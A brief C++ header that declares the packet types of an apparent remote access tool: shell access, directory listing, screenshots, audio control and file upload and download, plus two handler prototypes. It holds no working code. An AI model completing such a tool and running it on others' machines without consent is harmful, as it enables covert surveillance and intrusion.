#ifndef PACKETS_H
#define PACKETS_H

#include <string>
#include <vector>

#define PAK_CASE(type) case (int) type

enum class Packet {
	ping,
	stdIn,
	getShell,
	changeDir,
	listFiles,
	pwd,
	screenshot,
	audioControl,
	downloadFile,
	uploadFile
};

void handleCommand(std::vector<char>& buf);
void sendOut(std::string out);

#endif